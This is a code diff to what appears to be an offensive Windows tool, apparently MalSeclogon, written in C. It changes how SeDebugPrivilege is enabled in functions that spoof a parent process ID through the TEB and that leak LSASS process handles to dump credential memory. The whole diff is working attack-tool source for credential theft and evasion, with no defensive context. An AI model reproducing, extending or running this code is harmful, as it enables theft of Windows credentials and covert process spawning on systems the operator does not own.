@@ -5,7 +5,7 @@
 
 void usage();
 BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege);
-void EnableDebugPrivilege();
+void EnableDebugPrivilege(BOOL enforceCheck);
 void SpoofPidTeb(DWORD spoofedPid, PDWORD originalPid, PDWORD originalTid);
 void RestoreOriginalPidTeb(DWORD originalPid, DWORD originalTid);
 void FindProcessHandlesInLsass(DWORD lsassPid, HANDLE* handlesToLeak, PDWORD handlesToLeakCount);
@@ -132,10 +132,10 @@ BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege)
 	return TRUE;
 }
 
-void EnableDebugPrivilege() {
+void EnableDebugPrivilege(BOOL enforceCheck) {
 	HANDLE currentProcessToken = NULL;
 	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
-	if (!SetPrivilege(currentProcessToken, L"SeDebugPrivilege", TRUE)) {
+	if (enforceCheck && !SetPrivilege(currentProcessToken, L"SeDebugPrivilege", TRUE)) {
 		printf("SetPrivilege failed to enable SeDebugPrivilege. Run it as an Administrator. Exiting...\n");
 		exit(-1);
 	}
@@ -245,7 +245,7 @@ void MalSeclogonPPIDSpoofing(int pid, wchar_t* cmdline)
 	PROCESS_INFORMATION procInfo;
 	STARTUPINFO startInfo;
 	DWORD originalPid, originalTid;
-	EnableDebugPrivilege();
+	EnableDebugPrivilege(FALSE);
 	SpoofPidTeb((DWORD)pid, &originalPid, &originalTid);
 	RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
 	RtlZeroMemory(&startInfo, sizeof(STARTUPINFO));
@@ -273,7 +273,7 @@ void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath) {
 	HANDLE handlesToLeak[8192];
 	DWORD handlesToLeakCount = 0;
 	DWORD leakedHandlesCounter = 0;
-	EnableDebugPrivilege();
+	EnableDebugPrivilege(TRUE);
 	FindProcessHandlesInLsass(lsassPid, handlesToLeak, &handlesToLeakCount);
 	// hacky thing to respawn the current process with different commandline. This should flag our next execution to contains leaked handles
 	StringCchPrintfW(newCmdline, MAX_PATH, cmdlineTemplate, GetCommandLine(), L"-l 1");
